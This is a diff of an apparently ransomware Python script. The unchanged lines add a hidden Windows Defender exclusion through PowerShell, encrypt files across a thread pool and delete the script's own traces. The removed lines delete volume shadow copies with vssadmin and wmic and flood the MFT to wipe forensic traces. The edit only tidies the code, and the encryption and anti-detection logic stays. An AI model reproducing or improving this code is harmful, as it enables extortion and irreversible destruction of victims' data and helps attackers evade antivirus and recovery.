@@ -4,7 +4,6 @@ import time
 import threading
 import shutil
 import subprocess
-import random
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
 if getattr(sys, 'frozen', False):
@@ -23,16 +22,8 @@ def verificar_e_instalar_dependencias():
     except ImportError:
         pass
     
-    python_exe = None
-    for root, dirs, files in os.walk(SCRIPT_DIR):
-        for f in files:
-            if f.endswith('.exe') and ('python' in f.lower() or f.startswith('svc')):
-                python_exe = os.path.join(root, f)
-                break
-        if python_exe:
-            break
-    
-    if not python_exe:
+    python_exe = os.path.join(SCRIPT_DIR, 'python_portable', 'python.exe')
+    if not os.path.exists(python_exe):
         python_exe = sys.executable
     
     try:
@@ -57,21 +48,6 @@ def add_exclusion():
         ps_cmd = f'Add-MpPreference -ExclusionPath "{script_dir}"'
         subprocess.Popen(['powershell', '-w', 'h', '-c', ps_cmd], creationflags=0x08000000)
         time.sleep(3)
-    except:
-        pass
-
-
-def delete_vss():
-    try:
-        subprocess.Popen([
-            'vssadmin', 'Delete', 'Shadows', '/All', '/Quiet'
-        ], creationflags=0x08000000)
-        
-        subprocess.Popen([
-            'wmic', 'shadowcopy', 'delete'
-        ], creationflags=0x08000000)
-        
-        time.sleep(2)
     except:
         pass
 
@@ -101,10 +77,8 @@ def auto_destruir_archivos():
 def cleanup_python_thread():
     time.sleep(300)
     try:
-        for root, dirs, files in os.walk(SCRIPT_DIR):
-            for d in dirs:
-                if d.startswith('lib') and d[3:].isdigit():
-                    shutil.rmtree(os.path.join(root, d), ignore_errors=True)
+        if os.path.exists('python_portable'):
+            shutil.rmtree('python_portable')
     except:
         pass
 
@@ -114,22 +88,6 @@ def wipe_memory_aggressive():
         import gc
         for _ in range(10):
             gc.collect()
-    except:
-        pass
-
-
-def wipe_mft_slack():
-    try:
-        temp = os.path.join(os.environ.get('TEMP', ''), f'~mft{random.randint(10000,99999)}')
-        os.makedirs(temp, exist_ok=True)
-        
-        for i in range(50000):
-            try:
-                open(os.path.join(temp, f'{i}.tmp'), 'w').close()
-            except:
-                break
-        
-        shutil.rmtree(temp, ignore_errors=True)
     except:
         pass
 
@@ -156,7 +114,6 @@ def encriptar_archivo(enc, ruta):
 
 def main():
     try:
-        delete_vss()
         add_exclusion()
         
         if not verificar_e_instalar_dependencias():
@@ -175,7 +132,6 @@ def main():
                     future.result()
                 except:
                     pass
-        wipe_mft_slack()
         wipe_memory_aggressive()
     except:
         pass
